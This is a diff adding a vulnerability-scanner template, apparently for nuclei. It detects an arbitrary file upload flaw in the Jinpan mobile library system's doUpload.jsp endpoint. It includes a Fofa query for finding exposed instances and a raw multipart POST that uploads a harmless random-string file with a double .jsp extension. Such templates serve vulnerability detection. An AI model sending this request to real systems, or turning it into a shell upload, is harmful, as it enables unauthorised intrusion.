@@ -1,0 +1,41 @@
+id: jinpan-doupload-fileupload
+
+info:
+  name: 金盘移动图书馆系统存在任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  description: |-
+    金盘图书馆微信管理平台 doUpload.jsp接口存在任意文件上传漏洞，攻击者通过漏洞可以获取权限。
+    Fofa: app="金盘软件-金盘移动图书馆系统"
+  reference:
+    - https://mp.weixin.qq.com/s/vbuu5Dh7SshVtMVjJKaLKg
+  tags: 金盘-微信管理平台
+
+variables:
+  rboundary: "{{rand_text_alphanumeric(8)}}"
+  randstr: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /pages/admin/tools/uploadFile/doUpload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp.jsp"
+        Content-Type: image/jpeg
+
+        {{randstr}}
+        ------WebKitFormBoundary{{rboundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"filePaths":'
+          - '"fileNames":'
+          - '"fileSizes":'
+          - '"uploadFileNames":'
